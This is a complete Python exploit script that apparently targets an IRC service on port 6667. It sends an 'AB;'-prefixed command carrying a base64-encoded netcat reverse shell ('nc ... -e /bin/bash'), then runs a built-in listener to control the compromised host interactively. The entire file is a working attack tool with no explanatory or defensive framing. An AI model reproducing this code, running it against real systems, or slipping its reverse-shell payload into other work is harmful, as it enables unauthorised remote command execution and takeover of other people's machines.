#!/usr/bin/python3

import socket
import base64
import threading
import time

# Prompts the user for target and local IP/port information
rhost = input("Enter the target IP: ")
rport = int(input("Enter the target port (default 6667): "))
lhost = input("Enter the local IP : ")
lport = int(input("Enter the local listener port : "))

# Generates a payload using nc for reverse shell
payload = f'nc {lhost} {lport} -e /bin/bash'

# Encodes the payload to base64
def gen_payload(payload):
    base = base64.b64encode(payload.encode())
    return f'echo {base.decode()} | base64 -d | bash'

# Starts a listener inline for reverse shell
def inline_listener(start_event):
    try:
        print(f"[+] Listening on {lhost}:{lport} for interactive shell...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Avoid address already in use error
        sock.bind((lhost, int(lport)))
        sock.listen(1)

        # Signal that listener is ready
        start_event.set()

        conn, addr = sock.accept()
        print(f"[+] Connection received from {addr}")

        while True:
            cmd = input("$ ")
            if cmd.lower() == "exit":
                print("[+] Exiting shell.")
                break

            conn.sendall((cmd + "\n").encode())
            response = conn.recv(4096).decode(errors="ignore")
            print(response, end="")

        conn.close()
        sock.close()
    except Exception as e:
        print(f"[-] Failed to interact with the shell: {e}")

# Sends the exploit to the target
def exploit(target_ip, target_port, payload):
    try:
        print("[+] Connecting to target...")
        s = socket.create_connection((target_ip, target_port))

        encoded_payload = gen_payload(payload)
        s.sendall((f'AB; {encoded_payload} \n').encode())

        print("[+] Payload sent successfully!")
        s.close()
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

# Main execution
if __name__ == "__main__":
    # Synchronization event to ensure listener starts before exploit
    start_event = threading.Event()

    # Start the listener inline
    listener_thread = threading.Thread(target=inline_listener, args=(start_event,), daemon=True)
    listener_thread.start()

    # Wait for the listener to be ready
    if not start_event.wait(timeout=5):
        print("[-] Listener failed to start in time. Exiting.")
        exit(1)

    # Delay added to ensure listener is fully operational before exploit
    time.sleep(1)

    # Send the exploit
    exploit(rhost, rport, payload)

    # Keep the program alive for interaction
    listener_thread.join()
